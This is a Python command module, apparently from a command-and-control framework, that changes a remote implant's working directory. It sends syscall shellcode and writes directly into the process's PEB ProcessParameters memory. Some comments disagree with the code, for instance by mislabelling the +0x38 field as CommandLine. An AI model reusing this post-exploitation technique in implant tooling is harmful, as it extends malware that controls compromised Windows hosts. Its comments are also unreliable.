NAME = "cd"
DESCRIPTION = "Change the current working directory of the agent by updating the PEB ProcessParameters."
PARAMS = [
    {"name":"directory", "description":"Native path to change to (e.g. \\??\\C:\\Windows)", "type":"str"}
]

# Dependencies: 
# 1. NtQueryInformationProcess (to find PEB)
DEPENDENCIES = ["NtQueryInformationProcess", "NtAllocateVirtualMemory"]

def get_peb_address(agent_id):
    from services.orders import send_and_wait, read_scratchpad
    from models.syscall import Syscall
    from models.agent import Agent
    import struct

    agent = Agent.by_id(agent_id)
    syscall = Syscall.sys(agent.id, "NtQueryInformationProcess")
    
    # ProcessBasicInformation (0) requires a 48-byte buffer
    # We use the scratchpad as the buffer
    params = [0xFFFFFFFFFFFFFFFF, 0, agent.scratchpad, 48, 0] 
    
    from services.binary import push_syscall
    shellcode = push_syscall(syscall, params, agent.debug)
    
    response = send_and_wait(agent_id, shellcode)
    # Read the PEB address from the ProcessBasicInformation struct (offset 8 on x64)
    struct_data = read_scratchpad(agent_id, 16)[8:16]
    peb_address = int.from_bytes(struct_data, byteorder="little")
    return peb_address

def write_unicode_string(agent_id, string):
    from models.agent import Agent
    from services.binary import build_unicode_string
    from services.orders import write_to_agent
    agent_obj = Agent.by_id(agent_id)
    allocate_retval = NtAllocateVirtualMemory(agent_id, [0x1000, 0x04])
    unicode_string_data, next_ptr = build_unicode_string(allocate_retval["allocated_memory"], string)
    write_to_agent(agent_id, allocate_retval["allocated_memory"], unicode_string_data)
    buffer_ptr= allocate_retval["allocated_memory"] + 16
    return buffer_ptr, len(string) * 2

def function(agent_id, args):
    from services.orders import write_to_agent, read_from_agent
    import struct

    new_dir = args[0]
    if not new_dir.startswith("\\??\\"):
        new_dir = "\\??\\" + new_dir

    # 1. FIND THE PEB
    peb_addr = get_peb_address(agent_id)
    ##printf"[*] Found PEB at {hex(peb_addr)}")

    # 2. FIND ProcessParameters ADDRESS (PEB + 0x20 on x64)
    # We read 8 bytes from PEB + 0x20
    proc_params_addr = peb_addr + 0x20
    ##printf"[*] Found ProcessParameters at {hex(proc_params_addr)}")
    cur_dir_ptr = int.from_bytes(read_from_agent(agent_id, proc_params_addr, 8), byteorder="little")
    ##printf"[*] Found PProcessParameters at {hex(cur_dir_ptr)}")
    cur_dir_ptr = cur_dir_ptr+0x38
    ##printf"[*] Found CommandLine UNICODE_STRING at {hex(cur_dir_ptr)}")
    
    # We usually find where the existing buffer is and overwrite it, 
    # or allocate new memory. For simplicity, we overwrite the existing buffer point.
    # Note: In a real-world scenario, you should allocate new memory if the new path 
    # is longer than the MaximumLength.
    unicode_string_ptr, new_len = write_unicode_string(agent_id, new_dir)
    ##printf"[*] unicode_string_ptr = {hex(unicode_string_ptr)}")

    # 4. WRITE NEW DIRECTORY STRING
    write_to_agent(agent_id, cur_dir_ptr+8, int.to_bytes(unicode_string_ptr, 8, byteorder="little"))
    
        # 5. UPDATE UNICODE_STRING LENGTH (2 bytes at +0x38)
    write_to_agent(agent_id, cur_dir_ptr, struct.pack("<H", new_len))
    # Update MaximumLength (2 bytes at +0x3A)
    write_to_agent(agent_id, cur_dir_ptr + 2, struct.pack("<H", new_len + 2))

    ##printf"[+] Successfully changed directory to: {new_dir}")

    return {
        "Result": "Success",
        "NewDirectory": new_dir,
        "PEB": hex(peb_addr),
        "ProcessParameters": hex(proc_params_addr)
    }